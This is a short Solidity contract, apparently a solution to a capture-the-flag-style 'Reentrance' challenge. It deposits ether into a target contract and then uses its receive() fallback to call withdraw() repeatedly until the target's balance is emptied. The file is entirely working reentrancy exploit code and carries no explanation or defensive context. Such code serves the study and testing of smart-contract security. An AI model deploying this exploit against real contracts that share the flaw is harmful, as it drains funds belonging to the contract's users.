// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack{
    IReentrance private reentrance;

    constructor(address _reentrance) public {
        reentrance = IReentrance(_reentrance);
    }

    function attack(address _to) public payable { // msg.value 1 ether
        reentrance.donate{value: msg.value}(_to);
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            if(address(reentrance).balance >= 1 ether){
                reentrance.withdraw(1 ether);
            } else {
                reentrance.withdraw(address(reentrance).balance);
            }
        }
    }
}